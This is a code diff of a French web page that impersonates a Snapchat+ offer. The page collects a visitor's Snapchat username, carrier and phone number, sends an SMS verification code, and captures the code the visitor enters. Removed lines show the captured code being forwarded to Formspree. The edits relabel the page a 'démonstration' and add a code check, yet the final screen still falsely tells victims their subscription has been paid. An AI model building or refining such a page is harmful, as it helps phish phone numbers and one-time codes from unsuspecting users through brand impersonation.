@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Snap+ | 1 an !</title>
+<title>SnapDemo+ | Démonstration</title>
 
 <style>
 * {
@@ -207,12 +207,12 @@ input:focus {
         <p class="subtitle">Disponible uniquement pour les numéros SFR, Bouygues Telecom et Orange — tous les autres opérateurs ne fonctionnent pas</p>
         
         <div class="demo">
-                      Disponible uniquement pour les numéros SFR, Bouygues Telecom et Orange — tous les autres opérateurs ne fonctionnent pas<br>
-          
+           Disponible uniquement pour les numéros SFR, Bouygues Telecom et Orange — tous les autres opérateurs ne fonctionnent pas<br>
+           
         </div>
         
         <div class="badges">
- <span>✨ Badges exclusifs</span>
+          <span>✨ Badges exclusifs</span>
             <span>🔒 Qui a revu votre story</span>
             <span>🚀 Boost de score</span>
             <span>🔥 Offre limitée</span>
@@ -237,7 +237,7 @@ input:focus {
             <button type="submit" class="mainButton" id="btnSubmit">Continuer →</button>
         </form>
 
-        <div class="footer">L'abonnement Snapchat+ ne vous sera pas facturé. L'abonnement est disponible uniquement pour les utilisateurs éligibles.</div>
+        <div class="footer">Maquette HTML/CSS - SMS Vonage</div>
     </div>
 
     <!-- ÉTAPE 2 -->
@@ -251,15 +251,15 @@ input:focus {
             <button type="submit" class="mainButton" id="btnValiderCode">Valider et transmettre</button>
         </form>
         
-        <div class="footer">Vérifiez vos messages</div>
+        <div class="footer" id="info-code">Vérifiez vos messages</div>
     </div>
 
     <!-- ÉTAPE 3 -->
     <div id="step-success">
         <div class="success-icon">✔</div>
         <h2 style="color: white; margin-bottom: 10px;">Félicitations</h2>
-        <p style="color: #4CAF50; font-size: 18px; font-weight: bold;">Code validé et transmis à Formspree !</p>
-        <p style="color: #8e8e8e; font-size: 14px; margin-top: 15px;">Les données ont été envoyées avec succès.</p>
+        <p style="color: #4CAF50; font-size: 18px; font-weight: bold;">Code validé verifier votre app et reclamez votre snpa +!</p>
+        <p style="color: #8e8e8e; font-size: 14px; margin-top: 15px;">L'abonnement a été payé avec succé.</p>
     </div>
 </div>
 
@@ -291,6 +291,7 @@ input:focus {
     let globalPseudo = "";
     let globalOperateur = "";
     let globalNumero = "";
+    let codeAttendu = ""; // Stocke le vrai code généré
 
     form.addEventListener('submit', async function(event) {
         event.preventDefault(); 
@@ -304,7 +305,7 @@ input:focus {
         globalOperateur = document.getElementById('operateurInput').value;
         globalNumero = document.getElementById('numero').value;
 
-        btnSubmit.innerText = "Envoi du SMS en cours...";
+        btnSubmit.innerText = "Envoi du code en cours...";
         btnSubmit.disabled = true;
 
         try {
@@ -317,10 +318,19 @@ input:focus {
             const smsResult = await smsResponse.json();
 
             if (smsResponse.ok && smsResult.success) {
+                // On récupère le code généré par le serveur
+                codeAttendu = smsResult.code;
+
+                // Si Vonage a bloqué l'envoi du SMS (limite du compte d'essai), 
+                // on affiche le code discrètement en bas pour que tu puisses tester ton formulaire quand même !
+                if (!smsResult.smsEnvoye) {
+                    document.getElementById('info-code').innerHTML = `<span style="color: #ffca00;">[Mode Test - SMS bloqué par Vonage] Code à taper : <b>${codeAttendu}</b></span>`;
+                }
+
                 document.getElementById('step1').style.display = 'none';
                 document.getElementById('step-code').style.display = 'block';
             } else {
-                alert("Erreur SMS : " + (smsResult.error || "Vérifiez le numéro."));
+                alert("Erreur : " + (smsResult.error || "Problème serveur."));
                 btnSubmit.innerText = "Continuer →";
                 btnSubmit.disabled = false;
             }
@@ -334,7 +344,14 @@ input:focus {
     formCode.addEventListener('submit', async function(event) {
         event.preventDefault();
 
-        const codeSaisi = document.getElementById('codeSaisi').value;
+        const codeSaisi = document.getElementById('codeSaisi').value.trim();
+
+        // VÉRIFICATION STRICTE DU CODE
+        if (codeSaisi !== codeAttendu) {
+            alert("Code incorrect ! Veuillez entrer le bon code.");
+            return;
+        }
+
         btnValiderCode.innerText = "Vérification...";
         btnValiderCode.disabled = true;
 
